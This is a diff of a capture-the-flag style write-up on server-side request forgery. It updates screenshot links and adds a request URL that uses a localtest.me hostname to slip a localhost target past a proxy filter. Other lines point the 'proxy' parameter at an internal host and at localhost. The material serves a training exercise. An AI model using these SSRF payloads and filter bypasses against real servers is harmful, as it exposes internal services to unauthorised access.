@@ -34,15 +34,19 @@ Note that while the example of SSRF used in this task is effectively a Remote Fi
 
 > http://10.10.129.132/?proxy=http%3A%2F%2Flist.hohoho%3A80
 
-![](../.gitbook/assets/image%20%28190%29.png)
+![](../.gitbook/assets/image%20%28191%29.png)
 
 > http://10.10.129.132/?proxy=http%3A%2F%2Flist.hohoho%3A80
 
 ![](../.gitbook/assets/image%20%28138%29.png)
 
-> [http://10.10.129.132/?proxy=http%3A%2F%2Flocalhost](http://10.10.129.132/?proxy=http%3A%2F%2Flocalhost)
+> http://10.10.129.132/?proxy=http%3A%2F%2Flocalhost
 
 ![](../.gitbook/assets/image%20%28137%29.png)
+
+> http://10.10.129.132/?proxy=http%3A%2F%2Flist.hohoho.localtest.me
+
+![](../.gitbook/assets/image%20%28177%29.png)
 
 ![](../.gitbook/assets/image%20%28174%29.png)
 
